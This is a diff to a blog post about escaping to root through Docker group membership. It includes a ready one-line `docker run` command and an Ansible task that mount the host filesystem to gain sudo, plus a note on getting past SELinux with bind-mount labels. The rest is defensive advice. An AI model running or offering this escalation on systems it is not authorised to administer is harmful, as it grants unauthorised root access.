@@ -11,7 +11,7 @@ twittercard: big
 #### TL;DR
 If you somehow made it here looking for a one-line solution to give yourself `sudo` privileges when you're already a member of the `docker` group, try:
 ```sh
-docker run --rm -it -e HOSTUID="$(id -u)" -v "/:/host:rw" "registry.gitlab.com/alexhaydock/getroot:$(uname -m)"
+docker run --rm -it -e HOSTUID="$(id -u)" -v "/:/host:rw" "registry.gitlab.com/alexhaydock/getroot:latest"
 ```
 
 ***
@@ -134,7 +134,7 @@ So now that I had a nice concise single-line way of exploiting my own systems, I
 
 - name: Just a nice friendly Docker privilege escalation 🐳
   docker_container:
-    image: "registry.gitlab.com/alexhaydock/getroot:{{ ansible_architecture }}"
+    image: "registry.gitlab.com/alexhaydock/getroot:latest"
     env:
       HOSTUID: "{{ uid.stdout }}"
     volumes:
@@ -155,8 +155,9 @@ And voilà... I tested this thoroughly of course (lessons had been learned) and 
 * Configuration management is _terrible_, as it lets you quickly push minor config changes automatically to a huge number of systems.
 * RTFM, and _test your code_! Since this, I have implemented a strategy with [Vagrant](https://www.vagrantup.com/) and [Test Kitchen](https://github.com/test-kitchen/test-kitchen) which allows me to test my configuration changes before I deploy them and catch any issues before they spiral out of control.
 * The `docker` group is root. Don't add any users to the `docker` group who shouldn't have root access to the system.
-* I tested this on a system running SELinux and access to the `/etc/shadow` and `/etc/sudoers` files was completely blocked from inside the container. If I'd been running Fedora or CentOS instead of Ubuntu I'd probably be cursing myself right now and going through the pain of rebuilding 20+ systems, but it just goes to show that SELinux *works*! [Don't disable it](https://stopdisablingselinux.com/).
-* Further to the above, Red Hat's (fully compatible) answer to Docker is called [Podman](https://podman.io/) and doesn't require a big heavy daemon running as `root` like Docker does. This means there's no need for a specific group to allow unprivileged users to access the daemon. There isn't one.
+* I tested this on a system running SELinux and access to the `/etc/shadow` and `/etc/sudoers` from inside the container was blocked by SELinux. If I'd been running Fedora or CentOS instead of Ubuntu I'd probably be cursing myself right now and going through the pain of rebuilding 20+ systems, but it just goes to show that SELinux *works*! [Don't disable it](https://stopdisablingselinux.com/).
+* Yes, you _could_ add [the `:z` or `:Z` options](https://docs.docker.com/storage/bind-mounts/#configure-the-selinux-label) to the bind mount definition to push a SELinux-enabled system into letting you edit the file from within a container, but after you've done this the SELinux label of the file will be "wrong" and the system will refuse to boot (which is a nice security feature).
+* Further to the above, Red Hat maintain a (mostly completely compatible) answer to Docker called [Podman](https://podman.io/) and doesn't require a big heavy daemon running as `root` like Docker does. This means there's no need for a specific group to allow unprivileged users to access the daemon. There isn't one.
 * Podman allows unprivileged users to run containers completely rootless.
 * The [user namespace](https://www.redhat.com/sysadmin/rootless-podman-makes-sense) tools that Podman uses make managing bind-mount permissions a dream.
 * Yes, I'm switching to Podman. Can you tell?
